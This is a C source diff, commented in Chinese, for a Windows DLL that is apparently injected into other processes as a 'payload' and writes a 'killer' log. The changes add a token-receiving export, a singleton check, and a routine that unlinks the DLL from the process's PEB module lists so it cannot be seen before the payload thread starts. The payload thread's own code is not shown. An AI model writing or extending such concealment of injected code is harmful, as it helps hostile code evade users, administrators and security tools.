@@ -5,6 +5,16 @@
 /* 共享内存布局与命名常量：唯一来源见 xxipc.h */
 #include "xxipc.h"
 
+static ULONGLONG g_dwNameToken = 0;       /* 会话随机名 token：只由 XxSetNames 送进来 */
+
+/* 远程导出：接收会话随机名（方案 A；参数块由注入方清零并释放） */
+__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock) {
+    ULONGLONG tok = 0;
+    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
+    if (tok) g_dwNameToken = tok;
+    return TRUE;
+}
+
 static void WriteKillerLog(const WCHAR *fmt, ...) {
     HANDLE hMap = XXOpenShared();
     if (!hMap) return;
@@ -63,7 +73,7 @@ DWORD WINAPI PayloadThread(LPVOID lp) {
     return 0;
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {    UNREFERENCED_PARAMETER(reserved);
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hinst);
         WCHAR path[MAX_PATH];
@@ -78,6 +88,15 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
             WriteKillerLog(L"跳过自身 xx.exe PID=%lu", pid);
             return TRUE;
         }
+
+        /* 进程内单例：模块隐藏后注入方看不到我们，会反复注入；
+           已有实例时直接让加载失败，避免同一进程里塞进多份载荷。
+           名字带会话 token，对手没法预先抢占这个单例把载荷挡在门外。 */
+        XXWaitToken(&g_dwNameToken, 300);   /* 等注入方送名字（避免同名/异名错配） */
+        if (!XXModuleSingleton(L"payload", g_dwNameToken)) return FALSE;
+
+        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */
+
         CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
     }
     return TRUE;
